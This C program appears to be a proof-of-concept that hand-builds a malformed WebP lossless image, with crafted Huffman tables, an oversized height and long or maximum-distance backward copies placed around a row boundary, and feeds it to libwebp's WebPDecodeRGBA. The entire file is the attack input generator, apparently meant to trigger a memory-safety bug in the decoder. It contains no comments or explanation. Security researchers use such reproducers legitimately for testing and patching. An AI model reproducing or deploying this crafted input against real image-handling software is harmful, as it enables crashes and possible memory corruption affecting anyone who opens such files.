#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "webp/decode.h"

enum { WIDTH = 256, HEIGHT = 8288, ROW = 8256, MAX_LEN = 4095 };

typedef struct {
  uint8_t* data;
  size_t len;
  size_t cap;
  size_t bitpos;
} BitWriter;

static void bw_need(BitWriter* bw, size_t bytes) {
  size_t cap;
  if (bytes <= bw->cap) return;
  cap = bw->cap ? bw->cap : 4096;
  while (cap < bytes) cap *= 2;
  bw->data = (uint8_t*)realloc(bw->data, cap);
  memset(bw->data + bw->len, 0, cap - bw->len);
  bw->cap = cap;
}

static void bw_put(BitWriter* bw, uint32_t value, int nbits) {
  int i;
  for (i = 0; i < nbits; ++i) {
    size_t p = bw->bitpos++;
    bw_need(bw, (p >> 3) + 1);
    if ((value >> i) & 1u) bw->data[p >> 3] |= (uint8_t)(1u << (p & 7));
  }
  if (((bw->bitpos + 7) >> 3) > bw->len) bw->len = (bw->bitpos + 7) >> 3;
}

static void bw_clen_zeros(BitWriter* bw, int count) {
  bw_put(bw, 1, 1);
  bw_put(bw, (uint32_t)(count - 11), 7);
}

static void bw_green_lengths(BitWriter* bw) {
  bw_put(bw, 0, 1);
  bw_put(bw, 1, 4);
  bw_put(bw, 0, 3);
  bw_put(bw, 1, 3);
  bw_put(bw, 0, 3);
  bw_put(bw, 0, 3);
  bw_put(bw, 1, 3);
  bw_put(bw, 0, 1);
  bw_put(bw, 0, 1);
  bw_put(bw, 0, 1);
  bw_clen_zeros(bw, 138);
  bw_clen_zeros(bw, 116);
  bw_put(bw, 0, 1);
  bw_clen_zeros(bw, 22);
  bw_put(bw, 0, 1);
}

static void bw_simple1(BitWriter* bw) {
  bw_put(bw, 1, 1);
  bw_put(bw, 0, 1);
  bw_put(bw, 0, 1);
  bw_put(bw, 0, 1);
}

static void bw_dist_codes(BitWriter* bw) {
  bw_put(bw, 1, 1);
  bw_put(bw, 1, 1);
  bw_put(bw, 1, 1);
  bw_put(bw, 13, 8);
  bw_put(bw, 39, 8);
}

static void bw_literal(BitWriter* bw) { bw_put(bw, 0, 2); }

static void bw_copy_len1(BitWriter* bw) {
  bw_put(bw, 1, 2);
  bw_put(bw, 0, 1);
  bw_put(bw, 24, 5);
}

static void bw_copy_len4095_dist1(BitWriter* bw) {
  bw_put(bw, 3, 2);
  bw_put(bw, 1022, 10);
  bw_put(bw, 0, 1);
  bw_put(bw, 24, 5);
}

static void bw_copy_len4095_maxdist(BitWriter* bw) {
  bw_put(bw, 3, 2);
  bw_put(bw, 1022, 10);
  bw_put(bw, 1, 1);
  bw_put(bw, 262143, 18);
}

static uint8_t* build_webp(size_t* out_size) {
  BitWriter bw;
  size_t payload, riff_size, total, pad;
  uint8_t* webp;
  const int boundary = ROW * WIDTH;
  const int prefix = boundary - MAX_LEN;
  const int after = HEIGHT * WIDTH - boundary - MAX_LEN;
  int nlong, nshort, i;

  memset(&bw, 0, sizeof(bw));
  bw_put(&bw, 0x2f, 8);
  bw_put(&bw, WIDTH - 1, 14);
  bw_put(&bw, HEIGHT - 1, 14);
  bw_put(&bw, 0, 1);
  bw_put(&bw, 0, 3);
  bw_put(&bw, 0, 1);
  bw_put(&bw, 0, 1);
  bw_put(&bw, 0, 1);
  bw_green_lengths(&bw);
  bw_simple1(&bw);
  bw_simple1(&bw);
  bw_simple1(&bw);
  bw_dist_codes(&bw);

  bw_literal(&bw);
  nlong = (prefix - 1) / MAX_LEN;
  nshort = (prefix - 1) % MAX_LEN;
  for (i = 0; i < nlong; ++i) bw_copy_len4095_dist1(&bw);
  for (i = 0; i < nshort; ++i) bw_copy_len1(&bw);
  bw_copy_len4095_dist1(&bw);
  bw_copy_len4095_maxdist(&bw);
  nlong = after / MAX_LEN;
  nshort = after % MAX_LEN;
  for (i = 0; i < nlong; ++i) bw_copy_len4095_dist1(&bw);
  for (i = 0; i < nshort; ++i) bw_copy_len1(&bw);

  bw_need(&bw, bw.len + 32);
  bw.len += 32;

  payload = bw.len;
  pad = payload & 1u;
  riff_size = 4 + 8 + payload + pad;
  total = 8 + riff_size;
  webp = (uint8_t*)calloc(total, 1);
  memcpy(webp + 0, "RIFF", 4);
  webp[4] = (uint8_t)riff_size;
  webp[5] = (uint8_t)(riff_size >> 8);
  webp[6] = (uint8_t)(riff_size >> 16);
  webp[7] = (uint8_t)(riff_size >> 24);
  memcpy(webp + 8, "WEBP", 4);
  memcpy(webp + 12, "VP8L", 4);
  webp[16] = (uint8_t)payload;
  webp[17] = (uint8_t)(payload >> 8);
  webp[18] = (uint8_t)(payload >> 16);
  webp[19] = (uint8_t)(payload >> 24);
  memcpy(webp + 20, bw.data, payload);
  free(bw.data);
  *out_size = total;
  return webp;
}

int main(void) {
  size_t size = 0;
  uint8_t* webp = build_webp(&size);
  int w = 0, h = 0;
  uint8_t* rgba = WebPDecodeRGBA(webp, size, &w, &h);
  WebPFree(rgba);
  free(webp);
  return 0;
}
